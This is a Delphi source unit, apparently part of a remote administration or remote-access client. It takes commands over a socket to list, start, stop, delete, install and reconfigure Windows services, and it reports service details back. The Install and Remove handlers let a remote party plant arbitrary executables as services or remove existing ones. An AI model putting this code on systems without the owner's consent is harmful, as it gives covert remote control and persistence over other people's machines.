unit UnitServiceManager;

interface

uses
  winsvc,applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp;

procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'ServiceManager|' + Data);
end;

function ComputerName():string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  GetComputerName(buffer, size);
  ComputerName := buffer;
end;

function RegReadString(Key: HKey; SubKey: string; DataType: integer; Data: string): string;
var
  RegKey: HKey;
  Buffer: array[0..9999] of Char;
  BufSize: Integer;
begin
  BufSize := SizeOf(Buffer);
  Result := '';
  if RegOpenKey(Key,pchar(SubKey),RegKey) = ERROR_SUCCESS then begin;
    if RegQueryValueEx(RegKey, pchar(Data), nil,  @DataType, @Buffer, @BufSize) = ERROR_SUCCESS then begin;
      RegCloseKey(RegKey);
      Result := string(Buffer);
    end;
  end;
end;

procedure StopService(ServiceName: string);
var
  SCManager: SC_Handle;
  Service: SC_Handle;
  ServiceStatus: TServiceStatus;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  try
    Service := OpenService(SCManager, PChar(ServiceName), SERVICE_ALL_ACCESS);
    ControlService(Service, SERVICE_CONTROL_STOP, ServiceStatus);
  finally
    CloseServiceHandle(SCManager);
  end;
end;

procedure StartService(ServiceName: string);
var
  SCManager: SC_Handle;
  Service: SC_Handle;
  ARgs: pchar;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  try
    Service := OpenService(SCManager, PChar(ServiceName), SERVICE_ALL_ACCESS);
    Args := nil;
    winsvc.StartService(Service, 0, ARgs);
  finally
    CloseServiceHandle(SCManager);
  end;
end;

procedure RemoveService(ServiceName: string);
var
  SCManager: SC_Handle;
  Service: SC_Handle;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  try
    Service := OpenService(SCManager, PChar(ServiceName), SERVICE_ALL_ACCESS);
    DeleteService(Service);
  finally
    CloseServiceHandle(SCManager);
  end;
end;



function RegWriteString(Key: HKey; SubKey: string; DataType: integer; Data: string; Value: string): string;
var
  RegKey: HKey;
begin
  Result := '';
  if RegCreateKey(Key,pchar(SubKey),RegKey) = ERROR_SUCCESS then begin;
    RegSetValueEx(RegKey,pchar(Data),0,DataType,pchar(Value),Length(Value));
    RegCloseKey(RegKey);
  end;
end;

procedure EditService(ServiceName: string; DisplayName: string; FileName: string; Desc: string; StartType: integer);
var
  SCManager: SC_Handle;
  Service: SC_Handle;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  try
    Service := OpenService(SCManager,PChar(ServiceName),SERVICE_CHANGE_CONFIG);
    ChangeServiceConfig(Service,SERVICE_NO_CHANGE,StartType,SERVICE_NO_CHANGE,PChar(FileName),nil,nil,nil,nil,nil,PChar(DisplayName));
    RegWriteString(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\' + ServiceName + '\',REG_SZ,'Description',Desc);
  finally
    CloseServiceHandle(SCManager);
  end;
end;


procedure InstallService(ServiceName: string; DisplayName: string; FileName: string; Desc: string; StartType: integer; StartNow: integer);
var
  SCManager: SC_Handle;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  try
    CreateService(SCManager, PChar(ServiceName), PChar(DisplayName), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, STartType, SERVICE_ERROR_IGNORE, PChar(FileName), nil, nil, nil, nil, nil);
    EditService(ServiceName,DisplayName,FileName,Desc,StartType);
    if STartNow = 1 then StartService(ServiceName);
  finally
    CloseServiceHandle(SCManager);
  end;
end;

function RegReadDword(Key: HKey; SubKey: string; Data: string): dword;
var
  RegKey: HKey;
  Value, ValueLen: dword;
begin
  ValueLen := 1024;
  RegOpenKey(Key,pchar(SubKey),RegKey);
  RegQueryValueEx(RegKey, pchar(Data), nil, nil, @Value, @ValueLen);
  RegCloseKey(RegKey);
  Result := Value;
end;

function ServiceList: string;
var
  ServiceLoop: integer;
  SCManager: SC_Handle;
  nBytesNeeded, nServices, nResumeHandle: dword;
  ServiceStatus: array [0..511] of TEnumServiceStatus;
begin
  SCManager := OpenSCManager(nil, Nil, SC_MANAGER_ALL_ACCESS);
  if SCManager = 0 then Exit;
  //nResumeHandle := 0;

  EnumServicesStatus(SCManager, SERVICE_WIN32, SERVICE_STATE_ALL, ServiceStatus[0], sizeof(ServiceStatus), nBytesNeeded, nServices, nResumeHandle);
  for ServiceLoop := 0 to nServices - 1 do begin
    result := result + ServiceStatus[ServiceLoop].lpDisplayName + '|';
    result := result + ServiceStatus[ServiceLoop].lpServiceName + '|';
    result := result + inttostr(ServiceStatus[ServiceLoop].ServiceStatus.dwCurrentState) + '|';
    result := result + inttostr(RegReadDword(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\' + ServiceStatus[ServiceLoop].lpServiceName,'Start')) + '|';
    result := result + RegReadString(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\' + ServiceStatus[ServiceLoop].lpServiceName,REG_SZ,'ImagePath') + '|';
    result := result + RegReadString(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\' + ServiceStatus[ServiceLoop].lpServiceName,REG_SZ,'Description') + #13#10;
  end;
  CloseServiceHandle(SCManager);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'List' then begin
    SendData(Socket,Command + '|' + ServiceList);
  end;

  if Command = 'Start' then begin
    StartService(Data);
  end;

  if Command = 'Stop' then begin
    StopService(Data);
  end;

  if Command = 'Remove' then begin
    RemoveService(Data);
  end;

  if Command = 'Install' then begin
    InstallService(Split(Data,'|',1),Split(Data,'|',2),Split(Data,'|',3),Split(Data,'|',4),strtoint(Split(Data,'|',5)),strtoint(Split(Data,'|',6)));
  end;

  if Command = 'Edit' then begin
    EditService(Split(Data,'|',1),Split(Data,'|',2),Split(Data,'|',3),Split(Data,'|',4),strtoint(Split(Data,'|',5)));
  end;

end;

end.
